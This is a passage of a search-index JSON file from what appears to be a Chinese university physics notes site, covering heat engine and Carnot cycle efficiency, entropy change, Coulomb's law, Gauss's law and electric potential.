</ul>"},{"location":"Courses/Physics/PhysicsI/#_37","title":"\u70ed\u673a\u7684\u6548\u7387","text":"<p>\u5bf9\u4e8e\u6b63\u5faa\u73af\uff0c\u4e00\u5b9a\u8d28\u91cf\u7684\u5de5\u8d28\u5728\u4e00\u6b21\u5faa\u73af\u8fc7\u7a0b\u4e2d\u8981\u4ece\u9ad8\u6e29\u70ed\u6e90\u5438\u70ed\\(Q_1\\)\uff0c\u5bf9\u5916\u4f5c\u51c0\u529f\\(|W|\\)\uff0c\u53c8\u5411\u4f4e\u6e29\u70ed\u6e90\u653e\u51fa\u70ed\u91cf\\(Q _2\\)\uff0c\u800c\u5de5\u8d28\u56de\u5230\u521d\u6001\uff0c\u5185\u80fd\u4e0d\u53d8\uff0c\u5219 \u70ed\u673a\u6548\u7387 \\(\\eta\\) \u8868\u793a\u4e3a\uff1a</p> \\[\\begin{gather} |W|=Q_1 -Q_2; \\\\ \\eta =\\frac{ |W|}{Q_1} =\\frac{Q_1 -Q_2}{Q _1} . \\end{gather} \\] <p>\u70ed\u673a\u6548\u7387\u4f8b\u9898(\u8981\u6c42\u638c\u63e1\u5404\u79cd\u8fc7\u7a0b\u7684\u70ed\u91cf\u6c42\u6cd5!)</p> <p></p>"},{"location":"Courses/Physics/PhysicsI/#_38","title":"\u5236\u51b7\u673a\u548c\u5236\u51b7\u7cfb\u6570","text":"<p>\u5229\u7528\u5de5\u4f5c\u7269\u8d28\u7684\u9006\u5faa\u73af\uff0c\u4e0d\u65ad\u4ece\u4f4e\u6e29\u70ed\u6e90\u5438\u6536\u70ed\u91cf\uff0c\u8f6c\u9012\u7ed9\u9ad8\u6e29\u70ed\u6e90\u7684\u673a\u5668</p> <p>\u5bf9\u4e8e\u9006\u5faa\u73af\uff0c\u5de5\u8d28\u7ecf\u4e00\u5faa\u73af\uff0c\u5916\u754c\u5fc5\u987b\u5bf9\u7cfb\u7edf\u4f5c\u529f\uff0c\u7cfb\u7edf\u4ece\u4f4e\u6e29\u70ed\u6e90\u5438\u70ed\\(Q_2\\)\uff0c\u5411\u9ad8\u6e29\u70ed\u6e90\u653e\u70ed\\(Q _1\\)\uff0c\u4f7f\u4f4e\u6e29\u70ed\u6e90\u6e29\u5ea6\u66f4\u4f4e\uff0c\u800c\u5de5\u8d28\u56de\u5230\u521d\u6001\uff0c\u5185\u80fd\u4e0d\u53d8\uff0c\u5219 \u5236\u51b7\u7cfb\u6570 \\(\\omega\\) \u8868\u793a\u4e3a\uff1a</p> \\[\\omega =\\frac{Q_2}{|W|} =\\frac{Q_2} {Q_1 -Q_2} \\] <p>\u5faa\u73af\u8fc7\u7a0b\u70ed\u673a\u6548\u7387\u89e3\u9898\u6b65\u9aa4</p> <ul> <li>\u5224\u65ad\u662f\u6b63\u5faa\u73af\u8fd8\u662f\u9006\u5faa\u73af\uff0c\u51b3\u5b9a\u6c42\u70ed\u673a\u6548\u7387\u8fd8\u662f\u5236\u51b7\u7cfb\u6570</li> <li>\u4ee5\u5e38\u89c1\u7684\u6b63\u5faa\u73af\u9898\u76ee\u4e3a\u4f8b\uff0c\u5224\u65ad\u5faa\u73af\u6bcf\u4e00\u8fc7\u7a0b\u662f\u653e\u70ed\u8fd8\u662f\u5438\u70ed\uff0c\u8fd9\u5c06\u51b3\u5b9a\u8ba1\u7b97\u7684\u6b65\u9aa4<ul> <li></li> <li>\u8be5\u56fe\u4e2d\uff0cbc\u8fc7\u7a0b\u653e\u70ed\uff0cca\u8fc7\u7a0b\u5438\u70ed\uff0c\u6240\u4ee5 \\(\\eta =\\frac{ |W|}{Q_{ca}} =\\frac{Q_{ca} -Q_{bc}}{Q _{ca}}\\) </li> </ul> </li> </ul>"},{"location":"Courses/Physics/PhysicsI/#_39","title":"\u5361\u8bfa\u5faa\u73af","text":"<p>\u5de5\u4f5c\u5728\u4e24\u4e2a\u70ed\u6e90\uff08\u9ad8\u6e29\u70ed\u6e90 T1 \uff0c\u4f4e\u6e29\u70ed\u6e90 T2 \uff09\uff0c\u7531\u4e24\u4e2a\u7b49\u6e29\u8fc7\u7a0b\u3001\u4e24\u4e2a\u7edd\u70ed\u8fc7\u7a0b\u7ec4\u6210\u7684\u5faa\u73af</p> <p>T-S \u56fe</p> <p></p> <ul> <li>\u5361\u8bfa \u70ed\u673a\u6548\u7387 \\(\\eta _c=\\frac{T_1 -T_2}{T_1}\\)</li> <li>\u5361\u8bfa \u5236\u51b7\u7cfb\u6570 \\(e_c =\\frac{T_2}{T_1 -T_2}\\)</li> </ul> \u5361\u8bfa\u673a\u4f8b\u9898 <p> </p>"},{"location":"Courses/Physics/PhysicsI/#_40","title":"\u71b5\u53d8","text":"<p>\u5bf9\u4e8e\u5fae\u5c0f\u53ef\u9006\u8fc7\u7a0b\uff0c\u71b5\u589e\u91cf\u5199\u6210 \\(ds =\\frac{dQ}{T}\\) \u5355\u4f4d\u4e3a \\(J/K\\)</p> <ul> <li>\u7edd\u70ed\u53ef\u9006\u8fc7\u7a0b\uff1a \\(dQ=0\\ \\ \\Delta S=\\int ^b_a \\frac{dQ}{T}=0\\)</li> <li>\u4efb\u4f55\u53ef\u9006\u8fc7\u7a0b\uff1a \\(\\Delta S=vC_v \\ln\\frac{T_2}{T _1} +vR\\ln\\frac{V_2}{V _1}\\)<ul> <li>\u7b49\u4f53\u8fc7\u7a0b\u71b5\u53d8\uff1a \\(\\Delta S=vC_{V,m}\\ln \\frac{T_2} {T_1}\\)</li> <li>\u7b49\u538b\u8fc7\u7a0b\u71b5\u53d8\uff1a \\(\\Delta S=vC_{p,m}\\ln \\frac{T_2} {T_1}\\ \\ \uff08pV=vRT\uff09\\)</li> <li>\u7406\u60f3\u6c14\u4f53\u7b49\u6e29\u8fc7\u7a0b\u71b5\u53d8\uff1a \\(\\Delta S=vR\\ln\\frac{V_2}{V _1} =vR\\ln\\frac{p_1}{p _2}\\)</li> </ul> </li> </ul>"},{"location":"Courses/Physics/PhysicsI/#_41","title":"\u71b5\u589e\u52a0\u539f\u7406","text":"<p>\u5bf9\u4e8e\u4e00\u4e2a\u7edd\u70ed\u7cfb\u7edf\uff0c\\(dQ=0\\)\uff0c\u5219\u6709 \\(\\Delta S\\ge 0\\) </p> <ul> <li>\u5f53\u7edd\u70ed\u8fc7\u7a0b\u4e0d\u53ef\u9006\u5219\u53d6\u4e0d\u7b49\u53f7</li> <li>\u5f53\u7edd\u70ed\u8fc7\u7a0b\u53ef\u9006\u5219\u53d6\u7b49\u53f7</li> <li>\u7531\u6b64\u53ef\u77e5\u5b64\u7acb\u7cfb\u7edf\u71b5\u53ea\u589e\u4e0d\u51cf</li> </ul> <p>\u71b5\u53d8\u4f8b\u9898</p> <p></p>"},{"location":"Courses/Physics/PhysicsI/#_42","title":"\u7535\u78c1\u5b66","text":""},{"location":"Courses/Physics/PhysicsI/#_43","title":"\u5e93\u4f26\u5b9a\u5f8b","text":"\\[ \\overrightarrow{F_{12}}=\\frac{1}{4\\pi \\varepsilon_0}\\frac{q _1 q_2}{r _{12}^2} \\frac{\\overrightarrow{r _{12}}}{r _{12}}  \\ \\ \u5176\u4e2d\\varepsilon_0=\\frac{1}{4\\pi k}=8.85\\times10^{-12} C^2/(N\\cdot m^2) \\]"},{"location":"Courses/Physics/PhysicsI/#_44","title":"\u9759\u7535\u573a","text":"<p>\u76f8\u5bf9\u4e8e\u89c2\u5bdf\u8005\u9759\u6b62\u7684\u7535\u8377\u5468\u56f4\u6240\u5b58\u5728\u7684\u573a\u79f0\u4e3a\u9759\u7535\u573a\uff08\u8be5\u7535\u8377\u79f0\u4e3a\u573a\u6e90\u7535\u8377\uff09</p> <ul> <li>\u7535\u573a\u5f3a\u5ea6\uff1a \\(\\overrightarrow{E}=\\frac{\\overrightarrow{F}}{q_0}\\)</li> <li>\u7535\u901a\u91cf\uff1a \\(\\Phi=\\oint_S \\overrightarrow{E}d\\overrightarrow{S}\\) \u7b2c\u4e8c\u7c7b\u66f2\u9762\u79ef\u5206</li> </ul> <p>\u9ad8\u65af\u5b9a\u7406</p> <p>\u8fc7\u4efb\u610f\u95ed\u5408\u66f2\u9762\u7684\u7535\u901a\u91cf\u7b49\u4e8e\u8be5\u66f2\u9762\u6240\u5305\u56f4\u7684\u6240\u6709\u7535\u8377\u91cf\u7684\u4ee3\u6570\u548c\u9664\u4ee5\\(\u03b5_0\\)</p> <p>\\(\\Phi=\\oint_S \\overrightarrow{E}d\\overrightarrow{S} =\\frac{1}{\\varepsilon_0} \\sum q_i\\)</p> <ul> <li>\u901a\u8fc7\u95ed\u5408\u66f2\u9762\u7684\u7535\u901a\u91cf\u53ea\u53d6\u51b3\u4e8e\u95ed\u5408\u66f2\u9762\u5185\u5305\u56f4\u7684\u51c0\u7535\u8377\uff0c\u800c\u4e0e\u7535\u8377\u7684\u7a7a\u95f4\u5206\u5e03\u65e0\u5173\uff0c\u4f46\u7535\u8377\u7684\u7a7a\u95f4\u5206\u5e03\u4f1a\u5f71\u54cd\u95ed\u5408\u9762\u4e0a\u5404\u70b9\u5904\u7684\u573a\u5f3a\u5927\u5c0f\u548c\u65b9\u5411</li> <li>\u95ed\u5408\u9762\u5916\u7684\u7535\u8377\u53ca\u5176\u5206\u5e03\u5bf9\u95ed\u5408\u9762\u4e0a\u7684\u7535\u901a\u91cf\u6ca1\u6709\u8d21\u732e\uff0c\u4f46\u5c06\u5f71\u54cd\u95ed\u5408\u9762\u4e0a\u5404\u70b9\u7684\u573a\u5f3a\u5927\u5c0f\u548c\u65b9\u5411\uff0c\u5982\u4e0b\u56fe\u4e24\u79cd\u60c5\u5f62\uff1a \\(\u03a6_e\\) \u76f8\u540c\uff0c\u4f46E\u4e0d\u540c: </li> </ul> \u7403\u5bf9\u79f0\u5206\u5e03\u8f74\u5bf9\u79f0\u5206\u5e03\u65e0\u9650\u5927\u5e73\u9762\u7535\u8377 <p>\u5305\u62ec\u5747\u5300\u5e26\u7535\u7684\u7403\u9762\u3001\u7403\u4f53\u3001\u591a\u5c42\u540c\u5fc3\u7403\u58f3\u7b49</p> <p>\u4ee5\u534a\u5f84\u4e3aR\u7684\u5747\u5300\u5e26\u7535\u7403\u9762\u4e3a\u4f8b\uff0c\u9ad8\u65af\u9762\u53d6\u534a\u5f84\u4e3ar\u7684\u540c\u5fc3\u7403\u9762(\\(r\\ge R\\))\uff0c\u6839\u636e\u5b9a\u7406 \\(\\Phi=\\frac{q}{\\varepsilon_0}\\) \uff0c\u5219\u5e26\u7535\u7403\u9762\u5916\u4efb\u610f\u4e00\u70b9\u7684\u573a\u5f3a\u4e3a \\(\\overrightarrow{E}=\\frac{\\Phi}{4\\pi r^2} \\frac{\\overrightarrow{r}}{r}\\)</p> <p>\u5305\u62ec \u65e0\u9650\u957f \u5747\u5300\u5e26\u7535\u7684\u76f4\u7ebf\uff0c\u5706\u67f1\u9762\uff0c\u5706\u67f1\u4f53\u7b49</p> <p>\u4ee5\u534a\u5f84\u4e3aR\u7684\u5747\u5300\u5e26\u7535\u5706\u67f1\u9762\u4e3a\u4f8b\uff0c\u9ad8\u65af\u9762\u53d6\u540c\u8f74\u5c01\u95ed\u5706\u67f1\u9762\uff0c\u8fc7P\u70b9\u4f5c\u957f\u4e3al\uff0c\u534a\u5f84\u4e3ar(\\(r\\ge R\\))\u7684\u5706\u67f1\u5f62\u9ad8\u65af\u9762\uff0c\u5219\u7535\u901a\u91cf\u4e3a \\(\\Phi_e=\\oint _S \\overrightarrow{E}d\\overrightarrow{S}=\\int _{\u4fa7}\\overrightarrow{E}d\\overrightarrow{S} =E2\\pi rl\\)</p> <p>\u82e5\u95ed\u5408\u9762\u5185\u7684\u603b\u7535\u8377\u4e3a \\(\\lambda l\\) \uff0c\u7531\u9ad8\u65af\u5b9a\u7406\u5f97\uff1a \\(E\\cdot 2\\pi rl =\\frac{1}{\\varepsilon_0}\\lambda l\\ \\ \\Rightarrow \\ \\ E=\\frac{\\lambda}{2\\pi \\varepsilon_0 r}\\)</p> <p>\u5305\u62ec\u65e0\u9650\u5927\u7684\u5747\u5300\u5e26\u7535\u5e73\u9762\uff0c\u5e73\u677f\u7b49</p> <p>\u4ee5\u65e0\u9650\u5927\u5747\u5300\u5e26\u7535\u5e73\u9762\u4e3a\u4f8b\uff0c\u9ad8\u65af\u9762\u53d6\u8f74\u7ebf\u5782\u76f4\u4e8e\u5e26\u7535\u5e73\u9762\u3001\u4e24\u5e95\u9762\u5bf9\u79f0\u7684\u5c01\u95ed\u67f1\u9762\u3002\u8bbe\u65e0\u9650\u5927\u5747\u5300\u5e26\u7535\u5e73\u9762\u7684\u9762\u7535\u8377\u5bc6\u5ea6\u4e3a \\(\\sigma\\) \uff0c\u5219\u901a\u8fc7\u56fe\u793a\u9ad8\u65af\u9762\u7684\u603b\u7535\u901a\u91cf\u4e3a \\(\\Phi_e =\\oint_S\\overrightarrow{E}d\\overrightarrow{S}= \\int_{\u5de6\u5e95\u9762} \\overrightarrow{E}d\\overrightarrow{S}= \\int_{\u53f3\u5e95\u9762} \\overrightarrow{E}d\\overrightarrow{S}=2ES\\)</p> <p>\u4f9d\u636e\u9ad8\u65af\u5b9a\u7406\u6709\uff1a \\(2ES=\\frac{1}{\\varepsilon_0}\\sigma S \\ \\Rightarrow \\ E=\\frac{\\sigma}{2\\varepsilon_0}\\)</p> <p></p> <p>\u8bfe\u672c\u4f8b\u98981</p> <p></p> <ul> <li>\u8865\u5145 : \u5bf9\u4e8e\u6c42 \\(E_2\\) \u7684\u5927\u5c0f\uff0c\u8981\u7528\u5230\u4e8c\u91cd\u79ef\u5206<ul> <li>\\(dE=\\frac{dq}{4\\pi\\varepsilon_0 (x^2 +r^2)}\\times \\frac{x}{\\sqrt{x^2 +r^2}}= \\frac{\\sigma xrd\\theta dr}{4\\pi \\varepsilon_0 (x^2 +r^2) ^{3/2}}\\)</li> <li>\u518d\u8fdb\u884c\u79ef\u5206\u5373\u53ef\u6c42\u5f97\u7b54\u6848</li> </ul> </li> </ul>"},{"location":"Courses/Physics/PhysicsII/electricity/","title":"\u7535\u5b66\u90e8\u5206","text":"<p> \u7ea6 5300 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 26 \u5206\u949f</p> <p>\u672c\u7b14\u8bb0\u4e2d\u7684\u4e0a\u7bad\u5934\u4ec5\u4ee3\u8868\u5176\u662f\u77e2\u91cf\uff0c\u5199\u9898\u76ee\u65f6\u662f\u5426\u52a0\u4e0a\uff0c\u89c6\u60c5\u51b5\u800c\u5b9a</p>"},{"location":"Courses/Physics/PhysicsII/electricity/#_1","title":"\u5e93\u4f26\u5b9a\u5f8b","text":"<p>\u5728\u5927\u7269 I \u4e2d\u5df2\u6709\u6240\u8003\u67e5</p> <p>\u771f\u7a7a\u4e2d\u4e24\u4e2a\u9759\u6b62\u7684\u70b9\u7535\u8377 \\(q_1\\) \u4e0e \\(q_2\\) \u4e4b\u95f4\u7684\u76f8\u4e92\u4f5c\u7528\u529b\u7684\u5927\u5c0f\u548c \\(q_1\\) \u4e0e \\(q_2\\) \u7684\u4e58\u79ef\u6210\u6b63\u6bd4\uff0c\u548c\u5b83\u4eec\u4e4b\u95f4\u8ddd\u79bb\u7684\u5e73\u65b9\u6210\u53cd\u6bd4\uff0c\u4f5c\u7528\u529b\u7684\u65b9\u5411\u6cbf\u7740\u4e24\u70b9\u7535\u8377\u7684\u8fde\u7ebf\uff0c\u540c\u53f7\u7535\u8377\u76f8\u65a5\uff0c\u5f02\u53f7\u7535\u8377\u76f8\u5438</p> \\[ \\overrightarrow{F_{12}}=\\frac{1}{4\\pi \\varepsilon_0}\\frac{q _1 q_2}{r _{12}^2} \\frac{\\overrightarrow{r _{12}}}{r _{12}}  \\] <p>\\(\\varepsilon_0\\) \u662f\u771f\u7a7a\u4e2d\u7684\u4ecb\u7535\u5e38\u6570\uff0c\u5176\u6570\u503c\u7b49\u4e8e \\(\\frac{1}{4\\pi k}=8.85\\times10^{-12} C^2/(N\\cdot m^2)\\)</p>"},{"location":"Courses/Physics/PhysicsII/electricity/#_2","title":"\u9ad8\u65af\u5b9a\u7406","text":"<p>\u5728\u5927\u7269 I \u4e2d\u5df2\u6709\u6240\u8003\u67e5\uff0c\u4f46\u662f\u5927\u7269 II \u4e2d\u4f9d\u65e7\u5e38\u7528</p> <p>\u8fc7\u4efb\u610f\u95ed\u5408\u66f2\u9762\u7684\u7535\u901a\u91cf\u7b49\u4e8e\u8be5\u66f2\u9762\u6240\u5305\u56f4\u7684\u6240\u6709\u7535\u8377\u91cf\u7684\u4ee3\u6570\u548c\u9664\u4ee5\\(\u03b5_0\\)</p> \\[\\Phi=\\oint_S \\overrightarrow{E}d\\overrightarrow{S} =\\frac{1}{\\varepsilon_0} \\sum q_i\\] <ul> <li>\u901a\u8fc7\u95ed\u5408\u66f2\u9762\u7684\u7535\u901a\u91cf\u53ea\u53d6\u51b3\u4e8e\u95ed\u5408\u66f2\u9762\u5185\u5305\u56f4\u7684\u51c0\u7535\u8377\uff0c\u800c\u4e0e\u7535\u8377\u7684\u7a7a\u95f4\u5206\u5e03\u65e0\u5173\uff0c\u4f46\u7535\u8377\u7684\u7a7a\u95f4\u5206\u5e03\u4f1a\u5f71\u54cd\u95ed\u5408\u9762\u4e0a\u5404\u70b9\u5904\u7684\u573a\u5f3a\u5927\u5c0f\u548c\u65b9\u5411</li> <li>\u95ed\u5408\u9762\u5916\u7684\u7535\u8377\u53ca\u5176\u5206\u5e03\u5bf9\u95ed\u5408\u9762\u4e0a\u7684\u7535\u901a\u91cf\u6ca1\u6709\u8d21\u732e\uff0c\u4f46\u5c06\u5f71\u54cd\u95ed\u5408\u9762\u4e0a\u5404\u70b9\u7684\u573a\u5f3a\u5927\u5c0f\u548c\u65b9\u5411\uff0c\u5982\u4e0b\u56fe\u4e24\u79cd\u60c5\u5f62\uff1a \\(\u03a6_e\\) \u76f8\u540c\uff0c\u4f46E\u4e0d\u540c:</li> </ul> <p></p> \u7403\u5bf9\u79f0\u5206\u5e03\u8f74\u5bf9\u79f0\u5206\u5e03\u65e0\u9650\u5927\u5e73\u9762\u7535\u8377 <p>\u5305\u62ec\u5747\u5300\u5e26\u7535\u7684\u7403\u9762\u3001\u7403\u4f53\u3001\u591a\u5c42\u540c\u5fc3\u7403\u58f3\u7b49</p> <p>\u4ee5\u534a\u5f84\u4e3aR\u7684\u5747\u5300\u5e26\u7535\u7403\u9762\u4e3a\u4f8b\uff0c\u9ad8\u65af\u9762\u53d6\u534a\u5f84\u4e3ar\u7684\u540c\u5fc3\u7403\u9762(\\(r\\ge R\\))\uff0c\u6839\u636e\u5b9a\u7406 \\(\\Phi=\\frac{q}{\\varepsilon_0}\\) \uff0c\u5219\u5e26\u7535\u7403\u9762\u5916\u4efb\u610f\u4e00\u70b9\u7684\u573a\u5f3a\u4e3a \\(\\overrightarrow{E}=\\frac{\\Phi}{4\\pi r^2} \\frac{\\overrightarrow{r}}{r}=\\frac{q}{4\\pi \\varepsilon_0 r^2} \\frac{\\overrightarrow{r}}{r}\\)</p> <p>\u5305\u62ec \u65e0\u9650\u957f \u5747\u5300\u5e26\u7535\u7684\u76f4\u7ebf\uff0c\u5706\u67f1\u9762\uff0c\u5706\u67f1\u4f53\u7b49</p> <p>\u4ee5\u534a\u5f84\u4e3aR\u7684\u5747\u5300\u5e26\u7535\u5706\u67f1\u9762\u4e3a\u4f8b\uff0c\u9ad8\u65af\u9762\u53d6\u540c\u8f74\u5c01\u95ed\u5706\u67f1\u9762\uff0c\u8fc7P\u70b9\u4f5c\u957f\u4e3al\uff0c\u534a\u5f84\u4e3ar(\\(r\\ge R\\))\u7684\u5706\u67f1\u5f62\u9ad8\u65af\u9762\uff0c\u5219\u7535\u901a\u91cf\u4e3a \\(\\Phi_e=\\oint _S \\overrightarrow{E}d\\overrightarrow{S}=\\int _{\u4fa7}\\overrightarrow{E}d\\overrightarrow{S} =E2\\pi rl\\)</p> <p>\u82e5\u95ed\u5408\u9762\u5185\u7684\u603b\u7535\u8377\u4e3a \\(\\lambda l\\) \uff0c\u7531\u9ad8\u65af\u5b9a\u7406\u5f97\uff1a \\(E\\cdot 2\\pi rl =\\frac{1}{\\varepsilon_0}\\lambda l\\ \\ \\Rightarrow \\ \\ E=\\frac{\\lambda}{2\\pi \\varepsilon_0 r}\\)</p> <p>\u5305\u62ec\u65e0\u9650\u5927\u7684\u5747\u5300\u5e26\u7535\u5e73\u9762\uff0c\u5e73\u677f\u7b49</p> <p>\u4ee5\u65e0\u9650\u5927\u5747\u5300\u5e26\u7535\u5e73\u9762\u4e3a\u4f8b\uff0c\u9ad8\u65af\u9762\u53d6\u8f74\u7ebf\u5782\u76f4\u4e8e\u5e26\u7535\u5e73\u9762\u3001\u4e24\u5e95\u9762\u5bf9\u79f0\u7684\u5c01\u95ed\u67f1\u9762\u3002\u8bbe\u65e0\u9650\u5927\u5747\u5300\u5e26\u7535\u5e73\u9762\u7684\u9762\u7535\u8377\u5bc6\u5ea6\u4e3a \\(\\sigma\\) \uff0c\u5219\u901a\u8fc7\u56fe\u793a\u9ad8\u65af\u9762\u7684\u603b\u7535\u901a\u91cf\u4e3a \\(\\Phi_e =\\oint_S\\overrightarrow{E}d\\overrightarrow{S}= \\int_{\u5de6\u5e95\u9762} \\overrightarrow{E}d\\overrightarrow{S}= \\int_{\u53f3\u5e95\u9762} \\overrightarrow{E}d\\overrightarrow{S}=2ES\\)</p> <p>\u4f9d\u636e\u9ad8\u65af\u5b9a\u7406\u6709\uff1a \\(2ES=\\frac{1}{\\varepsilon_0}\\sigma S \\ \\Rightarrow \\ E=\\frac{\\sigma}{2\\varepsilon_0}\\)</p> <p></p>"},{"location":"Courses/Physics/PhysicsII/electricity/#_3","title":"\u7535\u52bf","text":""},{"location":"Courses/Physics/PhysicsII/electricity/#_4","title":"\u9759\u7535\u573a\u7684\u73af\u8def\u5b9a\u7406","text":"<p>\u2460 \u7535\u573a\u529b\u505a\u529f\u548c\u8def\u5f84\u65e0\u5173</p> <p>\u5f53\u8bd5\u9a8c\u7535\u8377\u5728\u9759\u6b62\u70b9\u7535\u8377\u7535\u573a\u4e2d\u79fb\u52a8\u65f6\uff0c\u7535\u573a\u529b\u6240\u505a\u7684\u529f\uff0c\u4ec5\u4e0e\u8bd5\u9a8c\u7535\u8377\u7535\u91cf\u7684\u5927\u5c0f\u53ca\u5176\u8d77\u70b9\u548c\u7ec8\u70b9\u7684\u4f4d\u7f6e\u6709\u5173\uff0c\u800c\u4e0e\u7535\u8377\u79fb\u52a8\u7684\u8def\u5f84\u65e0\u5173</p> <p>\u2461 \u9759\u7535\u573a\u73af\u8def\u5b9a\u7406</p> <p>\u5728\u9759\u7535\u573a\u4e2d\uff0c\u7535\u573a\u5f3a\u5ea6\u6cbf\u4efb\u610f\u95ed\u5408\u56de\u8def\u7684\u7ebf\u79ef\u5206\u6052\u7b49\u4e8e\u96f6\uff0c\u5373\uff1a</p> \\[ \\oint \\overrightarrow{E}\\cdot d\\overrightarrow{l} = 0 \\] <p>\u4e0a\u9762\u4e24\u6761\u8868\u8ff0\u7b49\u4ef7\uff0c\u4e5f\u8bf4\u660e\u4e86\u9759\u7535\u573a\u662f\u4fdd\u5b88\u573a\uff0c\u56e0\u6b64\u53ef\u4ee5\u5f15\u5165\u52bf\u80fd\u76f8\u5173\u7684\u6982\u5ff5</p>"},{"location":"Courses/Physics/PhysicsII/electricity/#_5","title":"\u7535\u52bf\u80fd\u4e0e\u7535\u52bf","text":"<p>\u5f53\u8bd5\u9a8c\u7535\u8377 \\(q_0\\) \u4ece a \u70b9\u79fb\u52a8\u81f3 b \u70b9\uff0c\u5176\u95f4\u7535\u573a\u529b\u6240\u505a\u7684\u529f\u5e94\u7b49\u4e8e\u7535\u8377\u9759\u7535\u52bf\u80fd\u589e\u91cf\u7684\u8d1f\u503c</p> <ul> <li>\u7535\u8377\u4ece\u9ad8\u7535\u52bf\u80fd\u70b9\u79fb\u5411\u4f4e\u7535\u52bf\u80fd\u70b9\uff0c\u7535\u52bf\u80fd\u51cf\u5c0f\uff0c\u7535\u573a\u529b\u505a\u6b63\u529f</li> <li>\u7535\u8377\u4ece\u4f4e\u7535\u52bf\u80fd\u70b9\u79fb\u5411\u9ad8\u7535\u52bf\u80fd\u70b9\uff0c\u7535\u52bf\u80fd\u589e\u52a0\uff0c\u7535\u573a\u529b\u505a\u8d1f\u529f</li> </ul> <p>\u7535\u52bf\u80fd\u662f\u76f8\u5bf9\u7684\uff0c\u9700\u8981\u89c4\u5b9a\u4e00\u4e2a\u7535\u52bf\u80fd\u4e3a 0 \u7684\u53c2\u8003\u70b9\u3002\u82e5\u65e0\u7279\u6b8a\u89c4\u5b9a\uff0c\u901a\u5e38\u53d6\u65e0\u9650\u8fdc\u5904\u4e3a\u7535\u52bf\u80fd\u4e3a 0 \u7684\u70b9\uff0c\u90a3\u4e48\u7535\u52bf\u80fd\u7b49\u4e8e\uff1a</p> \\[ W_P = \\int ^\\infty _P q_0 \\overrightarrow{E}\\cdot d\\overrightarrow{l} \\] <p>\u7535\u52bf\u662f\u67d0\u70b9\u7535\u52bf\u80fd\u4e0e\u8bd5\u9a8c\u7535\u5b50\u7684\u7535\u8377\u91cf\u7684\u6bd4\u503c\uff0c\u662f\u53ea\u4e0e\u4f4d\u7f6e\u6709\u5173\u7684\u51fd\u6570\uff1a</p> \\[ U_P = \\frac{W_P}{ q_0}= \\int ^{P_0} _P q_0 \\overrightarrow{E}\\cdot d\\overrightarrow{l} \\] <p>\u5176\u4e2d \\(P_0\\) \u662f\u7535\u52bf\u4e3a 0 \u7684\u53c2\u8003\u70b9\uff0c\u6839\u636e\u60c5\u51b5\u53ef\u4ee5\u9009\u53d6\u65e0\u7a77\u8fdc\u5904 (\\(\\infty\\))</p> <p>\u7ec3\u4e60\u4e60\u9898</p> <p></p> <p>\u7535\u52bf\u53e0\u52a0\u539f\u7406: \u70b9\u7535\u8377\u7cfb\u7535\u573a\u4e2d\u67d0\u70b9\u7684\u7535\u52bf\uff0c\u7b49\u4e8e\u6bcf\u4e00\u4e2a\u70b9\u7535\u8377\u5355\u72ec\u5b58\u5728\u65f6\u5728\u8be5\u70b9\u6240\u4ea7\u751f\u7684\u7535\u52bf\u7684\u4ee3\u6570\u548c</p> <p>\u6839\u636e\u7535\u52bf\u5b9a\u4e49\uff0c\u53ef\u4ee5\u6c42\u51fa\u5355\u4e2a\u70b9\u7535\u8377 q \u5728\u8ddd\u79bb\u4e3a r \u5904\u4ea7\u751f\u7684\u7535\u52bf\u4e3a \\(U=\\frac{q}{4\\pi \\varepsilon_0 r}\\)</p> <p>\u5206\u522b\u7b97\u51fa\u5404\u4e2a\u70b9\u7535\u8377\u5728\u8be5\u70b9\u5904\u7684\u7535\u52bf\uff0c\u6700\u540e\u6839\u636e\u7535\u52bf\u53e0\u52a0\u539f\u7406\u76f8\u52a0\u5373\u53ef\u5f97\u5230\u8be5\u70b9\u7684\u7535\u52bf</p> <p>\u82e5\u7535\u8377\u8fde\u7eed\u5206\u5e03\uff0c\u4e00\u822c\u5c06\u5176\u5206\u89e3\u6210\u5fae\u5143\u7535\u8377 \\(dq\\) \uff0c\u8868\u793a\u51fa \\(dU\\) \u540e\u8fdb\u884c\u79ef\u5206\u6c42\u89e3</p> <p>\u4e00\u79cd\u7279\u6b8a\u60c5\u51b5</p> <p>\u5373\u4fbf\u7403\u9762\u4e0d\u5747\u5300\u5e26\u7535\uff0c\u7403\u9762\u7535\u8377\u5728\u7403\u5fc3\u5904\u4ea7\u751f\u7684\u7535\u52bf\u53ea\u548c\u7403\u9762\u603b\u7535\u8377\u91cf\u6709\u5173</p> <p>\\(U=\\int _S \\frac{dq}{4\\pi \\varepsilon_0 R}=\\frac{q}{4\\pi \\varepsilon_0 R}\\)</p>"},{"location":"Courses/Physics/PhysicsII/electricity/#_6","title":"\u4ece\u7535\u52bf\u6c42\u7535\u573a","text":"<p>\u5f15\u5165\u7535\u52bf\u540e\uff0c\u7535\u573a\u529b\u505a\u529f\u53ef\u4ee5\u8868\u793a\u4e3a\uff1a</p> \\[     A_{ab} = q_0 \\int ^b _a \\overrightarrow{E}\\cdot d\\overrightarrow{l} = q_0 (U_a -U_b) \\] <p>\u90a3\u4e48\uff0c\u53d6\u8ddd\u79bb\u4e3a\u6781\u5c0f\u503c\uff0c\u53ef\u4ee5\u6c42\u51fa\u6b64\u5904\u7684\u7535\u573a\u5f3a\u5ea6\uff1a</p> \\[ \\overrightarrow{E} = -grad\\ U = -(\\frac{\\partial U}{\\partial x},\\frac{\\partial U}{\\partial y},\\frac{\\partial U}{\\partial z}) \\] <p>\u5373\uff0c\u7535\u573a\u4e2d\u4efb\u4e00\u70b9\u7684\u7535\u573a\u5f3a\u5ea6\u77e2\u91cf\uff0c\u7b49\u4e8e\u8be5\u70b9\u7535\u52bf\u68af\u5ea6\u77e2\u91cf\u7684 